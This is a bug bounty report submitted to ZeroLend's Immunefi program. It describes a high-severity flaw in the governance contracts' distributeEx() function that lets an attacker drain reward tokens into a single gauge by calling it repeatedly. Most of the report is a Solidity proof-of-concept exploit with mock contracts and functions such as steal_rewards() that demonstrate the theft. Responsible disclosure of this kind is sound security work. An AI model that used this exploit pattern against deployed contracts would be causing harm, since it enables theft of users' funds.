# 29122 - \[SC - High] All reward tokens can be stolen by an attacker ...

Submitted on Mar 7th 2024 at 18:58:55 UTC by @Trust for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29122

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

Tokens can be distributed in the PoolVoter through `distributeEx()`. It will allocate tokens to different gauges based on their weights.

## Vulnerability Details

The root issue is that when distributing it assumes all rewards were sent in the correct ratio, therefore it doesn't store how much was sent for each gauge. This could be exploited if `notifyRewardAmount()` returns false, in this case attacker can call `distributeEx()` again to re-dispatch the remaining balance of rewards. It could be repeated to claim a larger and large percentage of the reward balance, until there's diminishing returns. However, since `distributeEx()` can be called with any `start,finish` pair, we could exploit it regardly of any other token's notifyRewardAmount(). Just repeatedly call `distributeEx()` with the attacker's gauge to claim almost all rewards. We view this as a single root cause of not accounting for already sent portions for each gauge, so it is not submitted as two exploits.

## Impact Details

All reward tokens can be stolen by an attacker with interest in a particular gauge.

## Proof of Concept

The POC is implemented in a single file. Simply run steal\_rewards() to see an example of one gauge getting more rewards than it should. The lines can also be uncommented to view the correct allocation when distributeEx() is called with all gauges.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface IRewardDistributor {
    // used to notify a gauge/bribe of a given reward, this can create griefing attacks by extending rewards
    // TODO: rework to weekly resets, _updatePeriod as per v1 bribes
    function notifyRewardAmount(
        address token,
        uint amount
    ) external returns (bool);
}

interface IRewardBase {
    function incentivesLength() external view returns (uint);

    // returns the last time the reward was modified or periodFinish if the reward has ended
    function lastTimeRewardApplicable(
        address token
    ) external view returns (uint);

    // how to calculate the reward given per token "staked" (or voted for bribes)
    function rewardPerToken(address token) external view returns (uint);

    // how to calculate the total earnings of an address for a given token
    function earned(
        address token,
        address account
    ) external view returns (uint);

    // total amount of rewards returned for the 7 day duration
    function getRewardForDuration(address token) external view returns (uint);

    // allows a user to claim rewards for a given token
    function getReward(address token) external;

    // used to notify a gauge/bribe of a given reward, this can create griefing attacks by extending rewards
    // TODO: rework to weekly resets, _updatePeriod as per v1 bribes
    function notifyRewardAmount(
        address token,
        uint amount
    ) external returns (bool);
}

// Gauges are used to incentivize pools, they emit reward tokens over 7 days for staked LP tokens
// Nuance: getReward must be called at least once for tokens other than incentive[0] to start accrueing rewards
interface IGauge is IRewardBase {
    function rewardPerToken(
        address token
    ) external view override returns (uint);

    // used to update an account internally and externally, since ve decays over times, an address could have 0 balance but still register here
    function kick(address account) external;

    function derivedBalance(address account) external view returns (uint);

    function earned(
        address token,
        address account
    ) external view override returns (uint);

    function deposit(uint amount, address account) external;

    function withdraw() external;

    function withdraw(uint amount) external;

    function exit() external;
}

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// Gauges are used to incentivize pools, they emit reward tokens over 14 days for staked LP tokens
// Nuance: getReward must be called at least once for tokens other than incentive[0] to start accrueing rewards
contract LendingPoolGauge is IRewardDistributor {
    using SafeERC20 for IERC20;
    IRewardDistributor public supplyGauge;
    IRewardDistributor public borrowGauge;

    constructor(address _supplyGauge, address _borrowGauge) {
        supplyGauge = IRewardDistributor(_supplyGauge);
        borrowGauge = IRewardDistributor(_borrowGauge);
    }

    function notifyRewardAmount(
        address token,
        uint256 amount
    ) external returns (bool) {
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        // send 1/4 to the supply side
        IERC20(token).approve(address(supplyGauge), amount);
        bool a = supplyGauge.notifyRewardAmount(token, amount / 4);

        // send 3/4th to the borrow side
        IERC20(token).approve(address(borrowGauge), amount);
        bool b = borrowGauge.notifyRewardAmount(token, (amount / 4) * 3);

        return a && b;
    }
}


contract MockIncentiveController {

    uint capacity;

    constructor(uint cap)  {
        capacity = cap;
    }

    function notifyRewardAmount(
    IERC20 token,
    uint256 amount
) external returns (bool) {
    if(token.balanceOf(address(this)) + amount > capacity )
        return false;
    token.transferFrom(msg.sender, address(this), amount);
    return true;
    }
}

contract Distributor {

    constructor(IERC20 rewardToken) {
        reward = rewardToken;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (msg.sender != owner)
            revert("Not owner");
        _;
    }

    mapping(address => uint256) public claimable;
    IERC20 public reward;
    address owner;

    address[] internal _pools; // all pools viable for incentives
    mapping(address => address) public gauges; // pool => gauge
    mapping(address => bool) public isPool; // pool => bool
    mapping(address => address) public poolForGauge; // pool => gauge
    mapping(address => address) public bribes; // gauge => bribe
    mapping(address => uint256) public weights; // pool => weight
    mapping(address => mapping(address => uint256)) public votes; // nft => votes
    mapping(address => address[]) public poolVote; // nft => pools
    mapping(address => uint256) public usedWeights; // nft => total voting weight of user
    uint256 public index;
    mapping(address => uint256) public supplyIndex;
    
    function pools() external view returns (address[] memory) {
        return _pools;
    }


    function distribute(address _gauge) public {
        uint256 _claimable = claimable[_gauge];
        claimable[_gauge] = 0;
        IERC20(reward).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
        IERC20(reward).approve(_gauge, _claimable);
        if (!IGauge(_gauge).notifyRewardAmount(address(reward), _claimable)) {
            // can return false, will simply not distribute tokens
            claimable[_gauge] = _claimable;
        }
    }

    function set_claimable(address gauge, uint256 claim) external {
        claimable[gauge] = claim;
    }

    function registerGauge(
        address _asset,
        address _gauge
    ) external onlyOwner returns (address) {
        if (isPool[_asset]) {
            _pools.push(_asset);
            isPool[_asset] = true;
        }
        bribes[_gauge] = address(0);
        gauges[_asset] = _gauge;
        poolForGauge[_gauge] = _asset;
        //_updateFor(_gauge);
        return _gauge;
    }
}

contract Zero is ERC20 {
    constructor() ERC20("Zero","ZRO") {
        _mint(msg.sender, 100_000 * 1e18);
    }
}

contract DistributorPOC {
    MockIncentiveController supply_gauge;
    MockIncentiveController borrow_gauge;
    LendingPoolGauge lending_gauge;
    Zero zero;
    Distributor d;

    constructor() {
        supply_gauge = new MockIncentiveController(10e18);
        borrow_gauge = new MockIncentiveController(10e18);
        lending_gauge = new LendingPoolGauge(address(supply_gauge), address(borrow_gauge));
        zero = new Zero();
        d = new Distributor(zero);
        zero.transfer(address(d), 100e18);
    }

    function attack() external {
        d.set_claimable(address(lending_gauge), 30e18);
        d.distribute(address(lending_gauge));

        require(zero.balanceOf(address(supply_gauge)) == 7.5e18);
        require(zero.balanceOf(address(borrow_gauge)) == 0);

        require(d.claimable(address(lending_gauge)) == 30e18);        
    }

    function PoolFailPOC() external {
        require(d.pools().length == 0);
        d.registerGauge(address(0), address(1));
        require(d.pools().length == 0);

    }
}

contract DummyGauge {

    function notifyRewardAmount(
        address token,
        uint256 amount
    ) external returns (bool) {
        IERC20(token).transferFrom(msg.sender, address(this), amount);    
    }
}


contract DistributorEx {
    uint256 public totalWeight; // total voting weight
    mapping(address => uint256) public weights; // pool => weight
    address[] internal _pools; // all pools viable for incentives
    mapping(address => address) public gauges; // pool => gauge

    function setup() external {
        totalWeight = 2e18;
        _pools = new address[](2);
        _pools[0] = address(0x1111);
        _pools[1] = address(0x1112);
        weights[address(0x1111)] = 1e18;
        weights[address(0x1112)] = 1e18;
        gauges[address(0x1111)] = address(new DummyGauge());
        gauges[address(0x1112)] = address(new DummyGauge());

    }

    function distributeEx(
    address token,
    uint256 start,
    uint256 finish
    ) public {
        uint256 _balance = IERC20(token).balanceOf(address(this));
        if (_balance > 0 && totalWeight > 0) {
            uint256 _totalWeight = totalWeight;
            for (uint256 x = start; x < finish; x++) {
                uint256 _reward = (_balance * weights[_pools[x]]) /
                    _totalWeight;
                if (_reward > 0) {
                    address _gauge = gauges[_pools[x]];
                    IERC20(token).approve(_gauge, 0); // first set to 0, this helps reset some non-standard tokens
                    IERC20(token).approve(_gauge, _reward);
                    IGauge(_gauge).notifyRewardAmount(token, _reward); // can return false, will simply not distribute tokens
                }
            }
        }
    }
}

contract DistributorExPOC {

    function steal_rewards() external {
        Zero zero = new Zero();
        DistributorEx d = new DistributorEx();
        d.setup();
        zero.transfer(address(d), 10e18);
        
        //d.distributeEx(address(zero), 0, 2);
        //require(zero.balanceOf(d.gauges(address(0x1111))) == 5e18);
        //require(zero.balanceOf(d.gauges(address(0x1112))) == 5e18);
        d.distributeEx(address(zero), 0, 1);
        d.distributeEx(address(zero), 0, 1);
        require(zero.balanceOf(d.gauges(address(0x1111))) == 7.5e18);
    }
}
```
